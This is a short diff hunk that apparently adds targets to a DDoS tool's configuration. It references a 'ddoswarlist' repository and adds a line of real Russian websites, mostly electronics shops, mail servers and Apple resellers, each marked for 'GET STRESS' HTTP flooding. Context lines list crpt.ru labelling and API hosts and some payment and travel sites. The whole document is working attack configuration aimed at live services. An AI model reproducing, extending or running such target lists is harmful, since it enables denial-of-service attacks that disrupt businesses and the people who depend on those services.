@@ -6,6 +6,8 @@
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
 
+https://www.aktorstc.ru http://ooo-extruzia.ru/order https://mikron.ru https://www.gamma.spb.ru https://mail1.gamma.spb.ru https://e-components.ru https://mail.sp.ru https://micel.ru https://www.chipdip.ru https://micro-bond.com/moskva/ https://www.protehnology.ru https://www.micro-electronics.ru https://electron1ca.ru https://elektronika.store https://www.wite.ru https://www.landcom.ru https://re-store.ru/apple-iphone https://apple-store.net.ru/apple-iphone/ --http-methods GET STRESS
+
 https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru --http-methods GET STRESS
 
 #https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
